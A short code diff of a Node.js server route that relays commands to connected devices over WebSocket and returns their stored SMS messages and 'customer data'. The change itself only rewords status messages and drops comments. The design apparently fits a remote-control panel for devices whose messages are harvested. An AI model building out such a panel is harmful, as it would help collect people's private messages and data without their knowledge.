@@ -120,13 +120,10 @@ app.post('/api/command', async (req, res) => {
             return res.json({ success: true, device, messages: device.smsMessages || [], customerData: device.customerData || {} });
         }
         
-        if (!clients || clients.size === 0) return res.json({ success: false, message: 'Offline' });
+        if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device is OFFLINE' });
         
-        // Broadcast command to all connected sockets for this device
         clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
-        
-        // Return immediately that command is sent. UI will listen for COMMAND_RESULT via socket.io
-        return res.json({ success: true, message: 'Command sent to device...' });
+        return res.json({ success: true, message: 'Command sent. Waiting for response...' });
     } catch(e) { return res.status(500).json({ success: false }); }
 });
 
